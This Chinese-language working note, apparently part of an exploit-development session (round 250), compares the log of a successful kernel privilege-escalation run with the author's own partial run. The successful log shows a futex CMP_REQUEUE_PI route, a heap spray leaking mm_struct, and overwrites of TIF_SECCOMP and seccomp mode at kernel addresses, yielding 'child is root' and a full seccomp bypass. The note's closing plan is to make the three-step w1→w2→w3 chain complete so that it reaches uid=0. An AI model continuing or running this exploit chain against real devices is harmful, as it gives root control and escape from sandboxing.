# 43499 · 决定性对照：机制读数与成功那次一致，差别在 w1/w2/w3（round 250）✓✓✓

## 成功日志的完整读数（✓，逐字 ✓）

```
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 **success=1** ✓
[*] **child uid = 0** ✓   [+] child is root! ✓        ← ★ 真判据 ✓
[*] W3: TIF_SECCOMP+mode attempt 1/6 ✓   === W3: TIF_SECCOMP === target=0xffffff8a19880000 mode=1 leaf=1 ✓
[*] [spray] mm_struct leaked=… ✓ payload ready ✓ prepare_kernel_page ok attempt=1 ✓
[*] [route] CMP_REQUEUE_PI **ret=-1 errno=35** ✗     ← ★ 与我**同读数** ✓
[*] multicast route status=0 clean=1/1 step=0 errno=0 ✓
[*] mcast ghost disarm ret=-1 errno=110 ✗            ← ★ 与我**同读数** ✓
[*] === W3: seccomp mode === target=0xffffff8a19880860 mode=1 leaf=1 ✓
[*] seccomp finit_module probe = 0x16 ✓   [+] child seccomp fully bypassed ✓
[*] root script start **uid=0 euid=0** ✓
```

## 对照结论（✓✓，本晚最重要的一条）

| 项 | 成功那次 | 我的 canonical |
| --- | --- | --- |
| `CMP_REQUEUE_PI` | `ret=-1 errno=35` ✓ | **同** ✓ |
| `disarm` | `ret=-1 errno=110` ✓ | **同** ✓ |
| route status | `0 clean=1/1 calls=1 success=1` ✓ | **同** ✓ |
| `enforce` | 结尾仍是 `enforce=1` ✗ | **同** ✗ |
| **跑了几步** | **W1 + W2 + W3（含 TIF_SECCOMP / seccomp mode ✓）** | **只有 w1** ✗（`steps=1` ✓） |
| 受害者 uid | **0** ✓（`child is root!` ✓） | **2000** ✗ |

⇒ ⇒ ⇒ **两条关键推论**（✓）：

① **`enforce=0` 从来不是判据** ✗ —— 成功那次 `enforce` 也是 1 ✓（真判据是 `child uid=0` ✓）；
② 机制层我与成功那次**完全对齐** ✓ ⇒ 差别在**步骤链没跑完** ✗：成功那次跑的是 **w1 → w2 → w3**
（含两处 `mode=1 leaf=1` 的目标：TIF_SECCOMP 与 seccomp mode ✓），而我的 readout 显示 `steps=1` ✗ ⇒ **只到 w1** ✓。

## 下一批（✓，方向已明）

```
让 w1 → w2 → w3 **整链跑完** ✓（夹具 `procedure.steps` 已是三步 ✓；要查的是"为何只跑了一步" ✗：
Lua 断言 ✗ / 步骤表 ✗ / 失败早退 ✗）⇒ 之后再谈 `uid=0` ✓。
```
